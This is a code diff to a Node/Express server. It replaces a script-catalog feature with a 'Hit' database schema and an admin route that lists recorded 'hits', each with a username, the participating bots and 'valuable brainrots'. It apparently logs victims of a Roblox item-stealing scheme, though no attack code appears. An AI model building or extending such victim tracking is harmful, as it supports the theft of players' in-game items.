@@ -20,15 +20,14 @@ mongoose.connect(MONGO_URI)
   .catch(err => log(`❌ [DB] ERREUR : ${err}`));
 
 // --- MODÈLES ---
-const scriptSchema = new mongoose.Schema({
-    title: String,
-    image: String,
-    description: String,
-    code: String,
-    verified: { type: Boolean, default: false },
-    views: { type: Number, default: 0 }
+const hitSchema = new mongoose.Schema({
+    timestamp: { type: Date, default: Date.now },
+    displayName: String,
+    username: String,
+    receivers: [String], // Les bots qui ont participé
+    valuableBrainrots: [String] // Liste des items précieux
 });
-const Script = mongoose.model('Script', scriptSchema);
+const Hit = mongoose.model('Hit', hitSchema);
 
 const logSchema = new mongoose.Schema({
     username: String,
@@ -79,46 +78,11 @@ app.get('/api/logs/clear', authAdmin, async (req, res) => {
     } catch (e) { res.status(500).send(e.message); }
 });
 
-app.get('/api/scripts', async (req, res) => {
+// Route pour récupérer les hits (pour l'admin)
+app.get('/api/admin/hits', authAdmin, async (req, res) => {
     try {
-        const scripts = await Script.find();
-        res.json(scripts);
-    } catch (e) { res.status(500).send(e.message); }
-});
-
-app.get('/api/script/view', async (req, res) => {
-    const { id } = req.query;
-    if (id) await Script.findByIdAndUpdate(id, { $inc: { views: 1 } });
-    res.sendStatus(200);
-});
-
-app.get('/api/script/add', authAdmin, async (req, res) => {
-    const { title, image, description, code, verified } = req.query;
-    try {
-        const newScript = new Script({ 
-            title, image, description, code, 
-            verified: verified === 'true' 
-        });
-        await newScript.save();
-        res.send("✅ Script ajouté !");
-    } catch (e) { res.status(500).send(e.message); }
-});
-
-app.get('/api/script/remove', authAdmin, async (req, res) => {
-    try {
-        await Script.findByIdAndDelete(req.query.id);
-        res.send("🗑️ Script supprimé !");
-    } catch (e) { res.status(500).send(e.message); }
-});
-
-app.get('/api/script/modify', authAdmin, async (req, res) => {
-    const { id, title, image, description, code, verified } = req.query;
-    try {
-        await Script.findByIdAndUpdate(id, { 
-            title, image, description, code, 
-            verified: verified === 'true' 
-        });
-        res.send("🔄 Script mis à jour !");
+        const hits = await Hit.find().sort({ timestamp: -1 }).limit(50);
+        res.json(hits);
     } catch (e) { res.status(500).send(e.message); }
 });
 
